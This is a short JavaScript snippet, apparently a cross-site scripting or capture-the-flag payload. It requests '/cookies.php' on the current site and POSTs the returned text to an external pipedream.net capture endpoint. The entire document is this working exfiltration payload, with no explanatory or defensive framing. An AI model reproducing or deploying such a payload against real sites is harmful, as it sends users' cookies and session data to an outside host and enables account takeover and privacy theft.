fetch('/cookies.php')
  .then((response) => response.text())
  .then((text) => {
    fetch('https://eompinzus6nbmaw.m.pipedream.net', {
      method: "POST",
      body: "ok" + "\n" + text
    });
  });
